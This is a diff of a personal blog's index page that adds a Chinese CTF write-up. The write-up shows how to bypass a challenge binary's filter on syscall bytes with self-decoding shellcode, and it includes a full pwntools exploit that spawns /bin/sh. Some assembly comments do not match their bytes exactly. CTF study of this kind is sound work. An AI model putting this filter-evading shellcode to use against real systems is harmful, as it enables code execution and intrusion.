@@ -172,7 +172,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">18</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -183,7 +183,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -200,6 +200,108 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/09/2025-12-09-week1-Shellcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/12/09/2025-12-09-week1-Shellcode/" class="post-title-link" itemprop="url">CTF题解：shellcode</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-12-09 10:29:00" itemprop="dateCreated datePublished" datetime="2025-12-09T10:29:00+08:00">2025-12-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-12-10 13:49:25" itemprop="dateModified" datetime="2025-12-10T13:49:25+08:00">2025-12-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Shellcode（Decoder）"><a href="#Shellcode（Decoder）" class="headerlink" title="Shellcode（Decoder）"></a>Shellcode（Decoder）</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/shellcode/checksec.png" alt="image-20251209102926831"></p>
+<p>checksec保护几乎全开，来看反编译：</p>
+<p><img src="/images/shellcode/main1.png"></p>
+<p><img src="/images/shellcode/main2.png" alt="image-20251209111737923"></p>
+<p><strong>程序将 <code>DAT_114514000</code> 地址处的数据强制转换为函数指针并执行</strong>。现在问题在于，这里只有40字节布置shellcode，不知道这段区域是否可写可执行，以及filter函数过滤了什么。</p>
+<p>下面再分析一下：</p>
+<p><img src="/images/shellcode/vmmap.png"></p>
+<p><img src="/images/shellcode/filter.png" alt="image-20251209114310555"></p>
+<p>OK，看到 <strong>0x114514000到0x114515000处可写可执行</strong>，但是 **filter 会将连续的 \x0f\x05（<code>syscall</code> 指令的机器码） 转为 \0 **，现在的问题变成了如何绕过 syscall 的检查。</p>
+<p>因为这里只有 <code>\x0f\x05</code> 的过滤，我们可以尝试构造<strong>减1的编码规则，即让 <code>\x0f\x05</code> 变为 <code>\x0e\x04</code></strong>，再通过构造解码器解码syscall，从而绕过syscall过滤。</p>
+<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><p>我们在 filter 和 0x114514000 后面下断点，随便发送40个字符</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(p, <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *filter</span></span><br><span class="line"><span class="string">b *0x114514000</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/shellcode/xgx.png" alt="image-20251209212032233"></p>
+<p>可以看到全部落在了 0x114514000 区域，多运行几次发现，尽管有pie，这片区域地址不变。并且在执行0x114514000 区域前，0x114514000 会被加载到 rax 里，我们可以利用 rax 来计算要解码的 syscall 地址</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b&quot;\x48\x31\xff&quot;</span>                                <span class="comment"># xor rdi, rdi </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57&quot;</span>                                        <span class="comment"># push rdi</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span>    <span class="comment"># mov rdi, 0x68732f6e69622f2f</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57&quot;</span>                                        <span class="comment"># push rdi</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x89\xe7&quot;</span>                                <span class="comment"># mov rdi, rsp</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x31\xf6&quot;</span>                                <span class="comment"># xor rsi, rsi </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x31\xd2&quot;</span>                                <span class="comment"># xor rdx, rdx </span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfe\x40\x21&quot;</span>                                <span class="comment"># inc byte [rax + 0x20]</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfe\x40\x22&quot;</span>                                <span class="comment"># inc byte [rax +0x21]                                  </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x6a\x3b\x58&quot;</span>                                <span class="comment"># push 0x3b; pop rax</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0e\x04&quot;</span>                                    <span class="comment"># 编码后的 syscall</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;shellcode: <span class="subst">&#123;<span class="built_in">len</span>(shellcode)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#b *filter</span></span><br><span class="line"><span class="comment">#b *0x114514018</span></span><br><span class="line"><span class="comment">#c</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your shellcode: \n&quot;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
